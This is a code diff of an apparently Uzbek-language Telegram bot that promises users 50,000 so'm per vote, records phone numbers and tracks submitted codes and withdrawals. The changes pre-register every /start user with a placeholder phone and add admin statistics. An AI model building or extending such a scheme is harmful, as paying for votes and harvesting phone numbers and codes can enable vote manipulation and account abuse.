@@ -156,7 +156,7 @@ async def init_db():
         if conn:
             await conn.close()
 
-# ================= 1. START =================
+# ================= 1. START (O'ZGARTIRILGAN) =================
 @dp.message_handler(commands=['start'])
 async def start(message: types.Message):
     telegram_id = message.from_user.id
@@ -172,22 +172,21 @@ async def start(message: types.Message):
     conn = None
     try:
         conn = await get_db()
+        
+        # ✅ HAR QANDAY START BOSGANNI users jadvaliga qo'shish
+        await conn.execute(
+            "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
+            "ON CONFLICT (telegram_id) DO NOTHING",
+            telegram_id, "no_phone_yet"
+        )
+        
         user = await conn.fetchrow(
             "SELECT * FROM users WHERE telegram_id = $1",
             telegram_id
         )
         
-        if user:
-            await message.answer(
-                f"👋 <b>Xush kelibsiz!</b>\n\n"
-                f"📱 <b>Telefon:</b> {user['phone']}\n"
-                f"💰 <b>Balans:</b> {user['balance']:,} so'm\n\n"
-                f"🎁 <b>Yana ovoz bering va yana 50 000 so'm oling!</b>\n\n"
-                f"👇 Pastdagi tugmalardan foydalaning:",
-                reply_markup=user_menu,
-                parse_mode="HTML"
-            )
-        else:
+        # Agar telefoni bo'lmasa yoki 'no_phone_yet' bo'lsa
+        if user['phone'] == "no_phone_yet" or user['phone'] is None:
             user_states[telegram_id] = "waiting_phone"
             await message.answer(
                 f"🎉 <b>ASSALOMU ALAYKUM!</b>\n\n"
@@ -203,6 +202,17 @@ async def start(message: types.Message):
                 f"📱 <b>Telefon raqamingizni yuboring:</b>\n"
                 f"(Kontakt tugmasi yoki qo'lda yozing)",
                 reply_markup=phone_keyboard,
+                parse_mode="HTML"
+            )
+        else:
+            # Telefoni bor (to'liq ro'yxatdan o'tgan)
+            await message.answer(
+                f"👋 <b>Xush kelibsiz!</b>\n\n"
+                f"📱 <b>Telefon:</b> {user['phone']}\n"
+                f"💰 <b>Balans:</b> {user['balance']:,} so'm\n\n"
+                f"🎁 <b>Yana ovoz bering va yana 50 000 so'm oling!</b>\n\n"
+                f"👇 Pastdagi tugmalardan foydalaning:",
+                reply_markup=user_menu,
                 parse_mode="HTML"
             )
     except Exception as e:
@@ -280,6 +290,7 @@ async def process_phone(message: types.Message, phone: str):
     conn = None
     try:
         conn = await get_db()
+        # ✅ Telefon raqamini yangilash (no_phone_yet dan haqiqiy raqamga)
         await conn.execute(
             "INSERT INTO users (telegram_id, phone) VALUES ($1, $2) "
             "ON CONFLICT (telegram_id) DO UPDATE SET phone = $2",
@@ -469,20 +480,30 @@ async def show_balance(message: types.Message):
     try:
         conn = await get_db()
         user = await conn.fetchrow(
-            "SELECT balance FROM users WHERE telegram_id = $1",
+            "SELECT balance, phone FROM users WHERE telegram_id = $1",
             telegram_id
         )
         
-        if user:
-            await message.answer(
-                f"💳 <b>Hamyon</b>\n\n"
-                f"💰 Balans: {user['balance']:,} so'm\n\n"
-                f"💸 Yechish uchun kamida 100 000 so'm kerak.",
-                reply_markup=user_menu,
-                parse_mode="HTML"
-            )
-        else:
+        if not user:
             await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
+            return
+        
+        # Telefon raqami yo'q bo'lsa
+        if user['phone'] == "no_phone_yet":
+            await message.answer(
+                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
+                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
+                reply_markup=user_menu
+            )
+            return
+        
+        await message.answer(
+            f"💳 <b>Hamyon</b>\n\n"
+            f"💰 Balans: {user['balance']:,} so'm\n\n"
+            f"💸 Yechish uchun kamida 100 000 so'm kerak.",
+            reply_markup=user_menu,
+            parse_mode="HTML"
+        )
     except Exception as e:
         logger.error(f"❌ Balans xatosi: {e}")
     finally:
@@ -502,12 +523,21 @@ async def withdraw_start(message: types.Message):
     try:
         conn = await get_db()
         user = await conn.fetchrow(
-            "SELECT balance FROM users WHERE telegram_id = $1",
+            "SELECT balance, phone FROM users WHERE telegram_id = $1",
             telegram_id
         )
         
         if not user:
             await message.answer("❌ Ro'yxatdan o'tmagansiz. /start bosing")
+            return
+        
+        # Telefon raqami yo'q bo'lsa
+        if user['phone'] == "no_phone_yet":
+            await message.answer(
+                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
+                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
+                reply_markup=user_menu
+            )
             return
         
         balance = user['balance']
@@ -674,13 +704,15 @@ async def admin_withdraw_action(callback: types.CallbackQuery):
             if conn:
                 await conn.close()
 
-# ================= 11. ADMIN STATISTIKA =================
+# ================= 11. ADMIN STATISTIKA (O'ZGARTIRILGAN) =================
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📊 Statistika")
 async def admin_stats(message: types.Message):
     conn = None
     try:
         conn = await get_db()
-        users_count = await conn.fetchval("SELECT COUNT(*) FROM users")
+        total_users = await conn.fetchval("SELECT COUNT(*) FROM users")
+        registered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone != 'no_phone_yet'")
+        unregistered_users = await conn.fetchval("SELECT COUNT(*) FROM users WHERE phone = 'no_phone_yet'")
         pending = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'pending'")
         verified = await conn.fetchval("SELECT COUNT(*) FROM codes WHERE status = 'verified'")
         total_balance = await conn.fetchval("SELECT COALESCE(SUM(balance), 0) FROM users")
@@ -688,11 +720,13 @@ async def admin_stats(message: types.Message):
         
         await message.answer(
             f"📊 <b>STATISTIKA</b>\n\n"
-            f"👥 Foydalanuvchilar: {users_count}\n"
+            f"👥 Jami foydalanuvchilar: {total_users}\n"
+            f"✅ Ro'yxatdan o'tganlar: {registered_users}\n"
+            f"⏳ Telefon kiritmaganlar: {unregistered_users}\n"
             f"💰 Jami balans: {total_balance:,} so'm\n"
-            f"⏳ Kutayotgan: {pending}\n"
-            f"✅ Tasdiqlangan: {verified}\n"
-            f"💸 Yechish: {pending_withdraws}",
+            f"⏳ Kutayotgan kodlar: {pending}\n"
+            f"✅ Tasdiqlangan kodlar: {verified}\n"
+            f"💸 Yechish so'rovlari: {pending_withdraws}",
             parse_mode="HTML"
         )
     except Exception as e:
@@ -754,7 +788,7 @@ async def pending_withdraws(message: types.Message):
         if conn:
             await conn.close()
 
-# ================= 14. BARCHAGA XABAR =================
+# ================= 14. BARCHAGA XABAR (O'ZGARMAGAN) =================
 @dp.message_handler(lambda msg: msg.from_user.id == ADMIN_ID and msg.text == "📨 Barchaga xabar")
 async def broadcast_start(message: types.Message):
     admin_states[ADMIN_ID] = "waiting_message"
@@ -768,6 +802,7 @@ async def broadcast_send(message: types.Message):
     conn = None
     try:
         conn = await get_db()
+        # ✅ HAMMA START BOSGANLARGA yuboradi (telefon raqami bo'lmasa ham)
         users = await conn.fetch("SELECT telegram_id FROM users")
         
         sent = 0
@@ -797,14 +832,23 @@ async def check_balance(message: types.Message):
     try:
         conn = await get_db()
         user = await conn.fetchrow(
-            "SELECT balance FROM users WHERE telegram_id = $1",
+            "SELECT balance, phone FROM users WHERE telegram_id = $1",
             message.from_user.id
         )
         
-        if user:
-            await message.answer(f"💰 Balans: {user['balance']:,} so'm", reply_markup=user_menu)
-        else:
+        if not user:
             await message.answer("❌ Ro'yxatdan o'tmagansiz. /start")
+            return
+        
+        if user['phone'] == "no_phone_yet":
+            await message.answer(
+                "❌ Siz hali ro'yxatdan o'tmagansiz!\n\n"
+                "🗳️ Ovoz berish tugmasini bosing va telefon raqamingizni yuboring.",
+                reply_markup=user_menu
+            )
+            return
+        
+        await message.answer(f"💰 Balans: {user['balance']:,} so'm", reply_markup=user_menu)
     except Exception as e:
         logger.error(f"❌ Balans xatosi: {e}")
     finally:
@@ -839,7 +883,6 @@ async def start_http_server():
         await site.start()
         logger.info(f"🌐 HTTP server port {PORT} da ishga tushdi")
         
-        # Serverni ushlab turish
         while True:
             await asyncio.sleep(3600)
     except Exception as e:
@@ -854,7 +897,7 @@ async def keep_alive():
             logger.info("📡 Ping yuborildi")
         except Exception as e:
             logger.error(f"❌ Ping xatosi: {e}")
-        await asyncio.sleep(60)  # Har 1 daqiqada
+        await asyncio.sleep(60)
 
 # ================= MAIN =================
 async def on_startup(dp):
@@ -864,18 +907,13 @@ async def on_startup(dp):
         await init_db()
     except Exception as e:
         logger.error(f"❌ Database init xatosi: {e}")
-        # Database xatosi bo'lsa ham bot ishga tushsin
     
-    # HTTP serverni parallel ishga tushirish
     asyncio.create_task(start_http_server())
-    
-    # Keep-alive vazifasini ishga tushirish
     asyncio.create_task(keep_alive())
     
     logger.info("✅ Bot tayyor!")
 
 async def on_shutdown(dp):
-    """Bot o'chganda"""
     logger.info("🛑 Bot o'chmoqda...")
     try:
         await bot.close()
@@ -884,7 +922,6 @@ async def on_shutdown(dp):
     logger.info("✅ Bot o'chdi")
 
 if __name__ == "__main__":
-    # Xatoliklarni tutish va qayta ishga tushirish
     while True:
         try:
             executor.start_polling(
